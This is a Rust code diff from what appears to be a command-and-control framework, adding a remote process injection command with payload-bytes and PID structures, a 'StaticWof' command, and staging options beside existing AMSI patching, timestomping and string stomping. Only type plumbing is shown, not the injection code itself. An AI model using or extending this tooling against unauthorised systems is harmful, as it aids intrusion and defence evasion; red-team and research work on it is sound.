@@ -54,6 +54,9 @@ pub enum Command {
     /// Messages we intercepted from the console to be sent to the c2
     ConsoleMessages,
     Spawn,
+    StaticWof,
+    /// Perform remote process injection
+    Inject,
     // This should be totally unreachable; but keeping to make sure we don't get any weird UB, and
     // make sure it is itemised last in the enum
     Undefined,
@@ -193,6 +196,8 @@ impl Display for Command {
             Command::ConsoleMessages => "Agent console messages",
             Command::WhoAmI => "whoami",
             Command::Spawn => "SpawnChild",
+            Command::StaticWof => "StaticWof",
+            Command::Inject => "Inject",
         };
 
         write!(f, "{choice}")
@@ -204,6 +209,24 @@ pub struct DotExInner {
     /// A partial path to the tool in the /tools mount
     pub tool_path: String,
     pub args: Vec<String>,
+}
+
+#[derive(Serialize, Deserialize, Clone)]
+#[serde(rename = "1")]
+pub struct InjectInnerForAdmin {
+    #[serde(rename = "2")]
+    pub download_name: String,
+    #[serde(rename = "3")]
+    pub pid: u32,
+}
+
+#[derive(Serialize, Deserialize, Clone)]
+#[serde(rename = "1")]
+pub struct InjectInnerForPayload {
+    #[serde(rename = "2")]
+    pub payload_bytes: Vec<u8>,
+    #[serde(rename = "3")]
+    pub pid: u32,
 }
 
 impl DotExInner {
@@ -247,6 +270,8 @@ pub enum AdminCommand {
     DotEx(DotExInner),
     WhoAmI,
     Spawn(String),
+    StaticWof(String),
+    Inject(InjectInnerForAdmin),
     /// Used for dispatching no admin command, but to be handled via a custom route on the C2
     None,
     Undefined,
@@ -269,6 +294,18 @@ impl Task {
             metadata,
             completed_time: 0,
         }
+    }
+
+    /// Deserialises the incoming data into a `T`, returning `None` if the metadata
+    /// was `None`, and `Ok(T)` / `Err(E)` depending on how the serde_json went
+    pub fn deserialise_metadata<'a, T: Deserialize<'a>>(
+        &'a self,
+    ) -> Option<Result<T, serde_json::Error>> {
+        let Some(ref metadata) = self.metadata else {
+            return None;
+        };
+
+        Some(serde_json::from_str(metadata))
     }
 }
 
@@ -398,10 +435,12 @@ pub struct NewAgentStaging {
     pub patch_amsi: bool,
     pub jitter: Option<u64>,
     pub timestomp: Option<String>,
+    pub default_spawn_as: Option<String>,
     pub exports: Exports,
     pub svc_name: String,
     pub string_stomp: Option<StringStomp>,
     pub mutex: Option<String>,
+    pub wofs: Option<Vec<String>>,
 }
 
 impl NewAgentStaging {
@@ -428,6 +467,8 @@ impl NewAgentStaging {
             svc_name: "-".to_string(),
             string_stomp: None,
             mutex: None,
+            default_spawn_as: None,
+            wofs: None,
         }
     }
 }
